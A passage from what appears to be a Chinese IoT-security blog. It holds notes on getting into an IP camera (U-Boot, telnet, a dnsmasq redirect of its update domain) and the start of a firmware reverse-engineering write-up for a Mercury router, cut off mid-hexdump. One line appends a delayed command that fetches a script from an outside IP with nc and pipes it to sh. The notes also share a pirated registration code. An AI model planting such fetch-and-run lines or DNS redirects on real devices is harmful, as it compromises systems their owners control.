...</span><br><span class="line">heartbeat = 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 再次启动，uboot可正常引导系统</span></span><br><span class="line"><span class="comment"># telnet连接</span></span><br><span class="line">lxl@192  ~  telnet 192.168.0.106 2323</span><br><span class="line">Trying 192.168.0.106...</span><br><span class="line">Connected to 192.168.0.106.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br></pre></td></tr></table></figure>
<h2 id="change-dns"><a href="#change-dns" class="headerlink" title="change-dns"></a>change-dns</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 Ubuntu 桥接模式，有线，保证有网</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 lxl@ubuntu:/mnt/hgfs/3/dns$ sudo ./dnschange.sh</span></span><br><span class="line"><span class="comment"># ip是否正确</span></span><br><span class="line">the ip is: 192.168.0.104</span><br><span class="line">10.10.10.1, is right [Y/n]?</span><br><span class="line"><span class="comment"># dnsmasq安装失败</span></span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  dnsmasq</span><br><span class="line">0 upgraded, 1 newly installed, 0 to remove and 194 not upgraded.</span><br><span class="line">Need to get 16.2 kB of archives.</span><br><span class="line">E: Failed to fetch http://mirrors.aliyun.com/ubuntu/pool/universe/d/dnsmasq/dnsmasq_2.79-1ubuntu0.4_all.deb  Could not resolve <span class="string">'security.ubuntu.com'</span></span><br><span class="line">E: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing?</span><br><span class="line"><span class="comment"># dnsmasp启动失败</span></span><br><span class="line">Failed to restart dnsmasq.service: Unit dnsmasq.service not found.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 sudo apt install dnsmasq</span></span><br><span class="line">安装后会自动启动</span><br><span class="line">启动失败，bad option at line 2 of /etc/dnsmasq.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4  subl /etc/dnsmasq.conf</span></span><br><span class="line">lxl@ubuntu:/mnt/hgfs/3/dns$ cat /etc/dnsmasq.conf</span><br><span class="line">address=/aaa.com/192.168.0.104</span><br><span class="line">10.10.10.1</span><br><span class="line">lxl@ubuntu:/mnt/hgfs/3/dns$ subl /etc/dnsmasq.conf</span><br><span class="line">lxl@ubuntu:/mnt/hgfs/3/dns$ cat /etc/dnsmasq.conf</span><br><span class="line">address=/aaa.com/192.168.0.104</span><br><span class="line">address=/ipcupdate.av380.net/192.168.0.104</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 启动nginx、dnsmasq</span></span><br><span class="line">sudo service nginx status</span><br><span class="line">sudo service dnsmasq status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6 win7测试，修改本机dns</span></span><br><span class="line"><span class="comment"># 修改前</span></span><br><span class="line">C:\Users\lxl&gt;ping aaa.com</span><br><span class="line">正在 Ping aaa.com [45.60.62.121] 具有 32 字节的数据:</span><br><span class="line">来自 45.60.62.121 的回复: 字节=32 时间=194ms TTL=51</span><br><span class="line">来自 45.60.62.121 的回复: 字节=32 时间=194ms TTL=51</span><br><span class="line">来自 45.60.62.121 的回复: 字节=32 时间=194ms TTL=51</span><br><span class="line">来自 45.60.62.121 的回复: 字节=32 时间=194ms TTL=51</span><br><span class="line"><span class="comment"># 修改后</span></span><br><span class="line">C:\Users\lxl&gt;ping aaa.com</span><br><span class="line">正在 Ping aaa.com [192.168.0.104] 具有 32 字节的数据:</span><br><span class="line">来自 192.168.0.104 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line">来自 192.168.0.104 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line">来自 192.168.0.104 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line">来自 192.168.0.104 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7 测试dns，修改路由器dns</span></span><br><span class="line">原-router-ip、改-192.168.0.104（dnsmasq所在）</span><br></pre></td></tr></table></figure>
<h2 id="硬件相关"><a href="#硬件相关" class="headerlink" title="硬件相关"></a>硬件相关</h2><h3 id="判断UART"><a href="#判断UART" class="headerlink" title="判断UART"></a>判断UART</h3><ul>
<li><p>gnd</p>
<ul>
<li>指针类似wifi符号（蜂鸣器档）</li>
<li>路由器不需通电</li>
<li>黑色接地或金属板</li>
<li>红色试，出声的那个</li>
</ul>
</li>
<li><p>tx/rx/vcc</p>
<ul>
<li>指针20V（旋转方向无所谓）</li>
<li>需通电</li>
<li>黑色接gnd</li>
<li>红色试，电源开启后，电压小的为rx，高的为vcc/tx，其中稳定的为vcc</li>
</ul>
</li>
</ul>
<h2 id="设备文件传输"><a href="#设备文件传输" class="headerlink" title="设备文件传输"></a>设备文件传输</h2><ul>
<li>常规：wget/curl、tftp、scp</li>
<li><p>mount+nfs</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mac</span></span><br><span class="line">- 参考：https://blog.csdn.net/weixin_44204717/article/details/86526639</span><br><span class="line">- mac服务端：sudo vim /etc/exports：/Users/lxl/Public/4share -alldirs -network 192.168.55.0 -mask 255.255.255.0（默认就是rw权限，如果只读，则-ro）、nfsd status/<span class="built_in">enable</span>/start</span><br><span class="line">- 摄像头客户端：mount -t nfs 192.168.55.153:/Users/lxl/Public/nfs_share /home -o nolock</span><br><span class="line">- 客户端向外传文件：touch: 111: Permission denied（没权限，cp命令也如此），直接把nfs服务端的目录权限设为777</span><br><span class="line"></span><br><span class="line"><span class="comment"># win</span></span><br><span class="line">- 参考：https://blog.csdn.net/paladinzh/article/details/96162270</span><br><span class="line">- 下载：haneWIN NFS Server <span class="keyword">for</span> Windows，https://www.hanewin.net/nfs-e.htm</span><br><span class="line">- 注册码：https://www.cnblogs.com/SoaringLee/p/10532523.html（astray.cn-FBLZ9467C95EEB4B）</span><br><span class="line">- 配置：D:\tool\nfsd\nfs_dir -public -name:nfs</span><br><span class="line">- 挂载：摄像头失败，但Ubuntu成功</span><br><span class="line">mount -t nfs -o nolock 192.168.0.100:/nfs /tmp</span><br><span class="line">mount: mounting 192.168.0.100:/nfs on /tmp failed: No such device</span><br></pre></td></tr></table></figure>
</li>
<li><p>nc实现wget</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"sleep 120;cd /tmp;echo -n -e 'GET /03/a.sh HTTP/1.1\r\nHost: 149.28.59.105\r\n\r\n'|nc 149.28.59.105 80|sed '1,9d'|sh &amp;"</span> &gt;&gt; <span class="variable">$f</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="杂乱"><a href="#杂乱" class="headerlink" title="杂乱"></a>杂乱</h2><ul>
<li>ghidra跑过脚本后，将处理后的程序导出，file-export program或快捷键O，选择类型为ELF，可以在IDA中打开。</li>
<li>1</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file+zone+key+value</span></span><br><span class="line">result = IFCWriteStringOnce(<span class="string">"/mnt/mtd/mvconf/version.ini"</span>, <span class="string">"[app_version]"</span>, <span class="string">"name"</span>, name);</span><br><span class="line">result = IFCWriteStringOnce(<span class="string">"/mnt/mtd/mvconf/version.ini"</span>, <span class="string">"[app_version]"</span>, <span class="string">"date"</span>, date);</span><br><span class="line"></span><br><span class="line">/mnt/mtd/mvconf <span class="comment"># cat version.ini</span></span><br><span class="line">[app_version]</span><br><span class="line">name=AppV380E11_AKQ8_MS32006_V2.6.5.9</span><br><span class="line">date=20201229</span><br></pre></td></tr></table></figure>
<h2 id="评判漏洞"><a href="#评判漏洞" class="headerlink" title="评判漏洞"></a>评判漏洞</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 攻击者</span></span><br><span class="line">lan（network-adjacent）</span><br><span class="line">wan（remote attackers）</span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">是否需要认证</span><br><span class="line"><span class="comment"># 3 类型</span></span><br><span class="line">远程代码执行（溢出）</span><br><span class="line">命令注入（system）</span><br><span class="line">认证绕过</span><br><span class="line">信息泄漏</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/07/26/iot/某嵌入式设备固件分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/07/26/iot/某嵌入式设备固件分析/" class="post-title-link" itemprop="url">某嵌入式设备固件分析</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-07-26 14:41:33" itemprop="dateCreated datePublished" datetime="2021-07-26T14:41:33+08:00">2021-07-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-21 16:16:56" itemprop="dateModified" datetime="2022-02-21T16:16:56+08:00">2022-02-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="某嵌入式设备固件分析"><a href="#某嵌入式设备固件分析" class="headerlink" title="某嵌入式设备固件分析"></a>某嵌入式设备固件分析</h1><ul>
<li>固件：MW150R V5/V6_111219标准版，<a href="https://service.mercurycom.com.cn/download-269.html，mw150rv5-cn-up.bin（凑合用" target="_blank" rel="noopener">https://service.mercurycom.com.cn/download-269.html，mw150rv5-cn-up.bin（凑合用</a></li>
</ul>
<h2 id="01-binwalk"><a href="#01-binwalk" class="headerlink" title="01-binwalk"></a>01-binwalk</h2><ul>
<li>binwalk可以识别，但提取失败</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk mw150rv5-cn-up.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">20            0x14            IMG0 (VxWorks) header, size: 1522912</span><br><span class="line"><span class="comment"># 操作系统，VxWorks</span></span><br><span class="line">26724         0x6864          VxWorks operating system version <span class="string">"5.5.1"</span> , compiled: <span class="string">"Dec 15 2011, 22:21:51"</span></span><br><span class="line"><span class="comment"># 压缩方式，LZMA</span></span><br><span class="line">26820         0x68C4          LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, </span><br><span class="line">262292        0x40094         IMG0 (VxWorks) header, size: 1260640</span><br><span class="line">262420        0x40114         LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 3138464 bytes</span><br><span class="line"><span class="comment"># 文件系统，Wind River</span></span><br><span class="line"><span class="comment"># 基地址，owow出现的地方。167能对应</span></span><br><span class="line">1264484       0x134B64        Wind River management filesystem, compressed, 167 files</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># -Me也并未得到有用信息：只有xml和crt</span></span><br><span class="line"><span class="comment"># VxWorks是美国风河系统公司于1983年设计开发的一种嵌入式实时操作系统</span></span><br></pre></td></tr></table></figure>
<h2 id="02-敏感字符串"><a href="#02-敏感字符串" class="headerlink" title="02-敏感字符串"></a>02-敏感字符串</h2><ul>
<li>strings -n 8 mw150rv5.bin（ 指定最小的字符串长度为8</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">owowowowowowowowowowowowowowowow <span class="comment"># 敏感</span></span><br><span class="line">common.js</span><br><span class="line">|css_help.css</span><br><span class="line"><span class="string">'lcss_main.css</span></span><br></pre></td></tr></table></figure>
<h2 id="03-规律"><a href="#03-规律" class="headerlink" title="03-规律"></a>03-规律</h2><ul>
<li>hexdump -C mw150rv5-cn-up.bin | less</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 less 可以随意浏览文件，而 more 仅能向前移动，却不能向后移动，而且 less 在查看之前不会加载整个文件。</span></span><br><span class="line"><span class="comment"># /owow 搜索到字符串（？向上搜索</span></span><br><span class="line">00134b60  00 00 00 00 6f 77 6f 77  6f 77 6f 77 6f 77 6f 77  |....owowowowowow|</span><br><span class="line">00134b70  6f 77 6f 77 6f 77 6f 77  6f 77 6f 77 6f 77 6f 77  |owowowowowowowow|</span><br><span class="line">00134b80  6f 77 6f 77 00 00 00 01  00 00 00 a7 00 00 77 80  |owow..........w.|</span><br><span class="line">00134b90  63 6f 6d 6d 6f 6e 2e 6a  73 00 00 00 00 00 00 00  |common.js.......|</span><br><span class="line">00134ba0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00134bb0  00 00 00 00 00 00 00 00  00 00 07 ee 00 00 1f 7c  |...............||</span><br><span class="line">00134bc0  63 73 73 5f 68 65 6c 70  2e 63 73 73 00 00 00 00  |css_help.css....|</span><br><span class="line">00134bd0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00134be0  00 00 00 00 00 00 00 00  00 00 01 e0 00 00 27 6c  |..............<span class="string">'l|</span></span><br><span class="line"><span class="string">00134bf0  63 73 73 5f 6d 61 69 6e  2e 63 73 73 00 00 00 00  |css_main.css....|</span></span><br><span class="line"><span class="string">00134c00  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span></span><br><span class="line"><span class="string">00134c10  00 00 00 00 00 00 00 00  00 00 02 28 00 00 29 4c  |...........(..)L|</span></span><br><span class="line"><span class="string">00134c20  63 75 73 74 6f 6d 2e 6a  73 00 00 00 00 00 00 00  |custom.js.......|</span></span><br><span class="line"><span class="string">00134c30  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span></span><br><span class="line"><span class="string">00134c40  00 00 00 00 00 00 00 00  00 00 00 fd 00 00 2b 74  |..............+t|</span></span><br><span class="line"><span class="string">00134c50  68 65 6c 70 2e 6a 73 00  00 00 00 00 00 00 00 00  |help.js.........|</span></span><br></pre></td></tr></table></figure>
<ul>
<li>有如下规律</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 并非web文件用00填充至48字节，因为那8个字节不全是00</span></span><br><span class="line">owow字符串（32字节</span><br><span class="line">12字节</span><br><span class="line">web文件（00填充至40字节</span><br><span class="line">8字节</span><br><span class="line">web文件（00填充至40字节</span><br><span class="line">8字节</span><br><span class="line">web文件（00填充至40字节</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h2 id="04-解析"><a href="#04-解析" class="headerlink" title="04-解析"></a>04-解析</h2><h3 id="1-压缩算法的Magic"><a href="#1-压缩算法的Magic" class="headerlink" title="1-压缩算法的Magic"></a>1-压缩算法的Magic</h3><ul>
<li>一直到这个规律的结尾</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00136a80  57 7a 64 57 61 6e 54 79  70 65 52 70 6d 2e 68 74  |WzdWanTypeRpm.ht|</span><br><span class="line">00136a90  6d 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |m...............|</span><br><span class="line">00136aa0  00 00 00 00 00 00 00 00  00 00 04 20 00 03 c5 28  |........... ...(|</span><br><span class="line">00136ab0  57 7a 64 57 6c 61 6e 52  70 6d 2e 68 74 6d 00 00  |WzdWlanRpm.htm..| <span class="comment"># 结尾的web文件</span></span><br><span class="line">00136ac0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00136ad0  00 00 00 00 00 00 00 00  00 00 12 e4 00 03 c9 48  |...............H| <span class="comment"># 此规律的结尾（40web文件 + 8</span></span><br><span class="line">00136ae0  5a 00 00 80 00 26 22 00  00 00 00 00 00 00 33 1e  |Z....&amp;<span class="string">".......3.| # 紧接着5a 00 00 80</span></span><br></pre></td></tr></table></figure>
<ul>
<li>5D 00 00 80是LZMA压缩方式的魔术字节，位于压缩文件的开头。</li>
<li>而5a 00 00 80很类似，推测也是某种压缩算法的魔术字节，也位于每个压缩文件的开头，grep+wc看一下</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># grep后是行形式，wc -l统计多少行，故用来统计出现多少次</span></span><br><span class="line">$ hexdump -C mw150rv5-cn-up.bin | grep <span class="string">'5a 00 00 80'</span> | wc -l</span><br><span class="line">167</span><br></pre></td></tr></table></figure>
<ul>
<li>strings看web文件的出现次数</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ strings mw150rv5-cn-up.bin | grep -e <span class="string">'\.js'</span> -e <span class="string">'\.htm'</span> -e <span class="string">'\.css'</span> -e <span class="string">'\.jpg'</span> -e <span class="string">'\.gif'</span> -e <span class="string">'\.html'</span>| wc -l</span><br><span class="line">167</span><br></pre></td></tr></table></figure>
<ul>
<li>5a 00 00 80与web文件出现的次数一致，可提出猜想：二者成对存在，魔术字节位于每个web文件的前面（不一定是紧挨着</li>
</ul>
<h3 id="2-header结构（32-12字节）"><a href="#2-header结构（32-12字节）" class="headerlink" title="2-header结构（32+12字节）"></a>2-header结构（32+12字节）</h3><ul>
<li>此binwalk命令已失效，只能手动看</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># o offset</span></span><br><span class="line"><span class="comment"># l length</span></span><br><span class="line"><span class="comment"># b block，现在为K</span></span><br><span class="line"><span class="comment"># C 现在为指定目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 000f5b90  6f 77 6f 77 00 00 00 01  00 00 00 8c 00 00 6f 30  |owow..........o0|</span></span><br><span class="line">embedded@ubuntu:~/Mercury/110523$ binwalk -C -o 0xf5b94 -l 12 -b 4 mw150rv5.bin </span><br><span class="line">DECIMAL   	HEX       	DESCRIPTION</span><br><span class="line">-------------------------------------------------------------------------------------------------------</span><br><span class="line">1006484   	0xF5B94   	Hex:                 0x00000001</span><br><span class="line">				Little Endian Long:  16777216</span><br><span class="line">				Big Endian Long:     1</span><br><span class="line">				Little Endian Short: 0</span><br><span class="line">				Big Endian Short:    0</span><br><span class="line">				Little Endian Date:  Mon Jul 13 21:20:16 1970</span><br><span class="line">				Big Endian Date:     Wed Dec 31 16:00:01 1969</span><br><span class="line">1006488   	0xF5B98   	Hex:                 0x0000008C</span><br><span class="line">				Little Endian Long:  -1946157056</span><br><span class="line">				Big Endian Long:     140</span><br><span class="line">				Little Endian Short: 0</span><br><span class="line">				Big Endian Short:    0</span><br><span class="line">				Little Endian Date:  Thu Apr 30 16:49:04 1908</span><br><span class="line">				Big Endian Date:     Wed Dec 31 16:02:20 1969</span><br><span class="line">1006492   	0xF5B9C   	Hex:                 0x00006F30</span><br><span class="line">				Little Endian Long:  812580864</span><br><span class="line">				Big Endian Long:     28464</span><br><span class="line">				Little Endian Short: 0</span><br><span class="line">				Big Endian Short:    0</span><br><span class="line">				Little Endian Date:  Sun Oct  1 13:54:24 1995</span><br><span class="line">				Big Endian Date:     Wed Dec 31 23:54:24 1969</span><br></pre></td></tr></table></figure>
<ul>
<li>owow后的12字节：00 00 00 01  00 00 00 a7 00 00 77 80，4字节为一组<ul>
<li>00 00 00 01：可能为版本（反正不是文件大小和偏移</li>
<li>00 00 00 a7 ：十进制167，正好与前面次数相对应</li>
<li>00 00 77 80：未知</li>
</ul>
</li>
<li>至此，分析出以下结构</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct owfs_header</span><br><span class="line">&#123;</span><br><span class="line">   char magic[32];           <span class="comment"># 'owowowowowow...'</span></span><br><span class="line">   uint32_t version;         <span class="comment"># version #1</span></span><br><span class="line">   uint32_t file_count;      <span class="comment"># 167</span></span><br><span class="line">   uint32_t unknown;         <span class="comment"># ？？</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-fileEntry结构（40-8字节）"><a href="#3-fileEntry结构（40-8字节）" class="headerlink" title="3-fileEntry结构（40+8字节）"></a>3-fileEntry结构（40+8字节）</h3><ul>
<li>一般来讲，如果有文件名，那么还会有：文件在哪里、文件有多个</li>
<li>看第一个文件名common.js后的8字节：00 00 07 ee 和 00 00 1f 7c，推测二者是文件大小和在文件系统中的偏移</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00134b60  00 00 00 00 6f 77 6f 77  6f 77 6f 77 6f 77 6f 77  |....owowowowowow|</span><br><span class="line">00134b70  6f 77 6f 77 6f 77 6f 77  6f 77 6f 77 6f 77 6f 77  |owowowowowowowow|</span><br><span class="line">00134b80  6f 77 6f 77 00 00 00 01  00 00 00 a7 00 00 77 80  |owow..........w.|</span><br><span class="line">00134b90  63 6f 6d 6d 6f 6e 2e 6a  73 00 00 00 00 00 00 00  |common.js.......|</span><br><span class="line">00134ba0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00134bb0  00 00 00 00 00 00 00 00  00 00 07 ee 00 00 1f 7c  |...............||</span><br></pre></td></tr></table></figure>
<ul>
<li>假设第二个4字节00 00 1f 7c为偏移，基地址就取ow出现的地方00134b64（目前来看，其作为基址最合适</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基址0x134b64 + 偏移0x1f7c = 物理地址0x136AE0（文件起始），正是第一个5a 00 00 80出现的地方</span></span><br><span class="line">00136ab0  57 7a 64 57 6c 61 6e 52  70 6d 2e 68 74 6d 00 00  |WzdWlanRpm.htm..| <span class="comment"># 结尾的web文件</span></span><br><span class="line">00136ac0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00136ad0  00 00 00 00 00 00 00 00  00 00 12 e4 00 03 c9 48  |...............H| <span class="comment"># 此规律的结尾（40web文件 + 8</span></span><br><span class="line">00136ae0  5a 00 00 80 00 26 22 00  00 00 00 00 00 00 33 1e  |Z....&amp;<span class="string">".......3.| # 紧接着5a 00 00 80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 上述假设成立</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第二个4字节00 00 1f 7c为偏移，那么第一个4字节00 00 07 ee 为文件大小</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 起始地址0x136AE0 + 大小0x7ee = 结尾地址0x1372CE</span></span><br><span class="line">$ hexdump -s 0x1372ce -n 20 -C mw150rv5-cn-up.bin </span><br><span class="line">001372ce  00 00 5a 00 00 80 00 8d  08 00 00 00 00 00 00 00  |..Z.............|</span><br><span class="line">001372de  21 14 41 79                                       |!.Ay|</span><br><span class="line"><span class="comment"># 间隔了一个00后5a 00 00 80，这应该是第二个文件的魔术标记，验证确实如此</span></span><br><span class="line">$ hexdump -C mw150rv5-cn-up.bin | grep <span class="string">'5a 00 00 80'</span></span><br><span class="line">00136ae0  5a 00 00 80 00 26 22 00  00 00 00 00 00 00 33 1e  |Z....&amp;<span class="string">".......3.|</span></span><br><span class="line"><span class="string">001372d0  5a 00 00 80 00 8d 08 00  00 00 00 00 00 00 21 14  |Z.............!.|</span></span><br><span class="line"><span class="string">001374b0  5a 00 00 80 00 67 09 00  00 00 00 00 00 00 21 14  |Z....g........!.|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 为何间隔了一个00后才是标记呢？为了某种对齐？（填充00至4的倍数</span></span><br><span class="line"><span class="string">0x1372CE + 1 = 0x1372CF = 1274575（不是4的倍数</span></span><br><span class="line"><span class="string">0x1372CE + 2 = 0x1372D0 = 1274576（是4的倍数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 第二个web文件</span></span><br><span class="line"><span class="string">00134bc0  63 73 73 5f 68 65 